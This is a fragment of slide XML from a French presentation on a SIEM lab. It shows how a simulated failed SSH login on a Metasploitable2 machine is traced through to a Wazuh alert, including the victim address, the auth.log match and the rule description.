          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="677873" y="4960590"/>
            <a:ext cx="10690862" cy="1897410"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="26754998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3"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="213"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="8" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="2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5"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="11" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="215"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="12" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="21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14"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="15" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="214"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="16" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="21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16"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="19" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="216"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="20" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="2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 grpId="0"/>
      <p:bldP spid="214" grpId="0" animBg="1"/>
      <p:bldP spid="2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7" name="Google Shape;227;p13"/>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i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>Preuve</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t> : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>l'alerte</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>provient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t> bien de la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>victime</a:t>
            </a:r>
            <a:endParaRPr sz="2700" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="228" name="Google Shape;228;p13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1508760"/>
            <a:ext cx="6126480" cy="4114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42857"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="0F172A"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Une tentative SSH </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>échouée</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>volontaire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> est </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>simulée</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> sur Metasploitable2</a:t>
            </a:r>
            <a:endParaRPr sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="228600" marR="0" lvl="0" indent="-228600" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="142857"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="0E9E5E"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0E9E5E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>location = 192.168.56.110</a:t>
            </a:r>
            <a:endParaRPr sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="228600" marR="0" lvl="0" indent="-228600" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="142857"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="0F172A"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>→ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>adresse</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> de la machine </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>victime</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>confirmée</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> dans le </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>détail</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>l'alerte</a:t>
            </a:r>
            <a:endParaRPr sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="228600" marR="0" lvl="0" indent="-228600" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="142857"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="0F172A"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>full_log</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> correspond </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>exactement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> à la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>ligne</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> auth.log </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>d'origine</a:t>
            </a:r>
            <a:endParaRPr sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="228600" marR="0" lvl="0" indent="-228600" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="142857"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="0F172A"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>rule.description</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> : « User missed the password more than one time »</a:t>
            </a:r>
            <a:endParaRPr sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="228600" marR="0" lvl="0" indent="-228600" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="142857"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="0F172A"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Validation sans </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>ambiguïté</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> de la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>chaîne</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>complète</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>émission</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> → transport → </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>détection</a:t>
            </a:r>
            <a:endParaRPr sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="229" name="Google Shape;229;p13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7968601" y="1197864"/>
            <a:ext cx="2990878" cy="5285232"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2140"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F1F5F9"/>
          </a:solidFill>
          <a:ln w="22225" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="0E9E5E"/>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0" name="Google Shape;230;p13" descr="/sessions/intelligent-upbeat-noether/mnt/outputs/pptx_images/fig23_wazuh_source_confirm.jpg"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
